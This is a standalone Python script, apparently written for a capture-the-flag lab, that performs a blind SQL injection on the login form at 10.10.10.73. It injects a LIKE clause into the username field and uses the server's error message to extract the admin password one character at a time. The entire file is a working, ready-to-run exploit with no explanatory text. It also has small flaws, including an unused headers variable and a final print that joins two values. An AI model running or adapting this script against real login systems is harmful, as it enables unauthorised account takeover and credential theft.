#!/usr/bin/python3

import requests
import json
import sys

### USER SET VARIABLES ###
URL = 'http://10.10.10.73/login.php'
USER = 'admin'

### STATIC VARIABLES ###
DICT = '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'
FLAG = True
PWD = ""
TMP_PWD = ""

while FLAG:
    FLAG = False
    for i in range(0, len(DICT)):
        TMP_PWD = PWD + DICT[i]
        # print ("[!] Password Not Found")
        print ("[+] Trying: " + TMP_PWD)
        pattern = "admin' and password like '" + TMP_PWD + "%' --"
        payload = {'username': pattern, 'password': 'pass'}
        headers = {'content-type': 'text/html', 'host': 'http://10.10.10.73'}
        r = requests.post(URL, payload)
        if 'Wrong identification : admin' in r.text:
            print ('Wrong identification : admin' in r.text)
            FLAG = True
            break
    if FLAG:
        PWD = TMP_PWD
        print ("[+] Password Found: " + PWD)
print ("PSWD " + PWD + TMP_PWD)
